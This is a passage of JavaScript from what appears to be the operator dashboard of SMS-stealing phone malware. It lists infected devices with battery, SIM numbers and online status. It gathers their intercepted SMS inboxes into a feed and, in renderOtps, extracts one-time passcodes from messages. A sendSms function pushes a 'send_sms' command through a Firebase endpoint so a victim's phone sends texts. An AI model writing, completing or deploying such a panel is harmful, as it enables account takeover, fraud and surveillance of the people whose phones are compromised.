    +'<div class="device-row"><span class="lbl">Status</span><span style="color:'+(st?'var(--success)':'var(--text-dim)')+';font-weight:700;font-size:12px;">'+(st?'ONLINE':'OFFLINE')+'</span></div>'
    +'<div class="device-row" style="align-items:flex-start;"><span class="lbl">SIM</span>'+simHTML(d.sims)+'</div>'
    +(last?'<div class="device-row"><span class="lbl">Last SMS</span><span style="font-size:11px;color:var(--text-dim);">'+(last.sender||'')+'</span></div>':'')
    +'<div class="device-row"><span class="lbl">Messages</span><span style="font-weight:700;">'+(d.messages?Object.keys(d.messages).length:0)+'</span></div>'
    +'</div></div>';
}

function renderAll(){
  const ids=Object.keys(data.clients);
  const g=document.getElementById('grid-all');
  if(!ids.length){g.innerHTML='<div class="empty-state"><div class="icon">&#128187;</div><div class="msg">No Devices</div></div>';return}
  g.innerHTML=ids.map((id,i)=>devCard(id,data.clients[id],i)).join('');
}
function renderOnline(){
  const on=Object.entries(data.clients).filter(([_,d])=>d.status===true);
  const g=document.getElementById('grid-online');
  if(!on.length){g.innerHTML='<div class="empty-state"><div class="icon">&#128994;</div><div class="msg">No Online Devices</div></div>';return}
  g.innerHTML=on.map(([id,d],i)=>devCard(id,d,i)).join('');
}
function renderAllSms(){
  const all=[];
  Object.entries(data.clients).forEach(([id,d])=>{
    if(d.messages)Object.values(d.messages).forEach(s=>{if(s.message)all.push({...s,device:id})});
  });
  if(data.profex)Object.entries(data.profex).forEach(([id,msgs])=>{
    if(msgs)Object.values(msgs).forEach(s=>{if(s.text)all.push({message:s.text,sender:s.sender,dateTime:s.time,device:id,id:s.rawTs})});
  });
  all.sort((a,b)=>b.id-a.id);
  const c=document.getElementById('sms-feed');
  if(!all.length){c.innerHTML='<div class="empty-state"><div class="icon">&#128172;</div><div class="msg">No SMS</div></div>';return}
  c.innerHTML=all.slice(0,100).map(s=>'<div class="sms-feed-item" onclick="openDetail(\''+s.device+'\')"><span class="sf-sender">'+(s.sender||'?')+'</span> <span class="sf-body">'+(s.message||'')+'</span><div class="sf-meta"><span>'+(s.dateTime||'')+'</span></div></div>').join('');
  if(all.length>100)c.innerHTML+='<div style="text-align:center;padding:8px;color:var(--text-dim);font-size:11px;">Showing 100 of '+all.length+'</div>';
}
function renderOtps(){
  const otps=[];
  Object.entries(data.clients).forEach(([id,d])=>{
    if(d.messages)Object.values(d.messages).forEach(s=>{
      if(!isOTP(s.message))return;
      const codes=s.message.match(/\b(\d{4,8})\b/g);
      if(codes)codes.forEach(c=>{if(c.length>=4&&!c.startsWith('0'))otps.push({code:c,from:s.sender||'?',date:s.dateTime||'',device:id,id:s.id||0})});
    });
  });
  if(data.profex)Object.entries(data.profex).forEach(([id,msgs])=>{
    if(msgs)Object.values(msgs).forEach(s=>{
      if(!isOTP(s.text))return;
      const codes=s.text.match(/\b(\d{4,8})\b/g);
      if(codes)codes.forEach(c=>{if(c.length>=4&&!c.startsWith('0'))otps.push({code:c,from:s.sender||'?',date:s.time||'',device:id,id:s.rawTs||0})});
    });
  });
  otps.sort((a,b)=>b.id-a.id);
  const c=document.getElementById('otp-container');
  if(!otps.length){c.innerHTML='<div class="empty-state"><div class="icon">&#128272;</div><div class="msg">No OTPs</div></div>';return}
  c.innerHTML='<div style="display:flex;flex-direction:column;gap:6px;">'+otps.slice(0,100).map(o=>'<div class="sms-feed-item" onclick="openDetail(\''+o.device+'\')"><span class="sf-sender" style="font-size:16px;font-weight:800;">'+o.code+'</span> <span class="sf-body">from '+o.from+' | '+o.device.slice(0,6)+'</span><div class="sf-meta">'+o.date+'</div></div>').join('')+'</div>';
}

function renderDetail(id){
  const d=data.clients[id];if(!d)return;
  const st=d.status===true;
  const bat=d.battery||'?';
  let msgs=d.messages?Object.values(d.messages).sort((a,b)=>b.id-a.id):[];
  if(data.profex&&data.profex[id])Object.values(data.profex[id]).forEach(s=>{if(s.text)msgs.push({message:s.text,sender:s.sender,dateTime:s.time,id:s.rawTs})});
  msgs.sort((a,b)=>b.id-a.id);
  document.getElementById('detail-title').textContent='Device: '+id.slice(0,12);
  const simInfo=d.sims&&d.sims.length?d.sims.map(s=>'<div>'+(s.carrierName||'SIM')+': <strong>'+(s.phoneNumber&&s.phoneNumber!=='Unknown'?s.phoneNumber:'-')+'</strong></div>').join(''):'<span style="color:var(--text-dim)">No SIM data</span>';
  document.getElementById('detail-body').innerHTML='<div class="detail-grid">'
    +'<div class="detail-cell"><div class="l">Device ID</div><div class="v" style="font-size:12px;">'+id+'</div></div>'
    +'<div class="detail-cell"><div class="l">Battery</div><div class="v">'+batHTML(bat)+'</div></div>'
    +'<div class="detail-cell"><div class="l">Status</div><div class="v" style="color:'+(st?'var(--success)':'var(--text-dim)')+';">'+(st?'ONLINE':'OFFLINE')+'</div></div>'
    +'<div class="detail-cell"><div class="l">SIM Info</div><div class="v" style="font-size:12px;">'+simInfo+'</div></div>'
    +'<div class="detail-cell"><div class="l">Total SMS</div><div class="v">'+msgs.length+'</div></div>'
    +'</div>'
    +'<div class="detail-sms-title">SMS Inbox ('+msgs.length+')</div>'
    +'<div class="detail-sms-list">'
    +(msgs.length?msgs.slice(0,50).map(s=>'<div class="detail-sms"><div class="sh"><span class="sf">'+(s.sender||'?')+'</span><span class="sw">'+(s.dateTime||'')+'</span></div><div class="st">'+(s.message||'')+'</div></div>').join('')
      :'<div style="text-align:center;padding:30px;color:var(--text-dim);font-size:13px;">No SMS</div>')
    +'</div>';
}
function openDetail(id){
  renderDetail(id);
  window._currentDevice=id;
  document.getElementById('dashboard').style.display='none';
  document.getElementById('detail-page').classList.add('active');
}
function closeDetail(){
  window._currentDevice=null;
  document.getElementById('detail-page').classList.remove('active');
  document.getElementById('dashboard').style.display='block';
}


function openSmsModal(devId){
  document.getElementById('sms-did').value=devId||'';
  document.getElementById('sms-modal').classList.add('active');
}
function closeSmsModal(){document.getElementById('sms-modal').classList.remove('active')}
async function sendSms(){
  const device=document.getElementById('sms-did').value;
  const number=document.getElementById('sms-num').value;
  const message=document.getElementById('sms-msg').value;
  if(!device||!number||!message){t('Fill all fields','error');return}
  try{
    const cmd={action:'send_sms',deviceId:device,message:message,number:number,timestamp:Date.now()};
    await fetch(FB+'/data/command.json',{method:'PUT',body:JSON.stringify(cmd)});
    t('SMS sent to '+device,'success');
    closeSmsModal();
    document.getElementById('sms-num').value='';
    document.getElementById('sms-msg').value='';
  }catch(e){t('Failed','error')}
}

function switchTab(name,btn){
  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
  document.querySelectorAll('.tab-pane').forEach(p=>p.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('pane-'+name).classList.add('active');
}
function filterView(){
  const q=document.getElementById('search-input').value.toLowerCase();
  ['grid-all','grid-online'].forEach(id=>{document.querySelectorAll('#'+id+' .device-card').forEach(c=>{c.style.display=c.textContent.toLowerCase().includes(q)?'':'none'})});
}

window.addEventListener('load',()=>{setTimeout(()=>{document.getElementById('loading-overlay').classList.add('hidden');setTimeout(()=>document.getElementById('loading-overlay').style.display='none',800);},2000);});
</script>
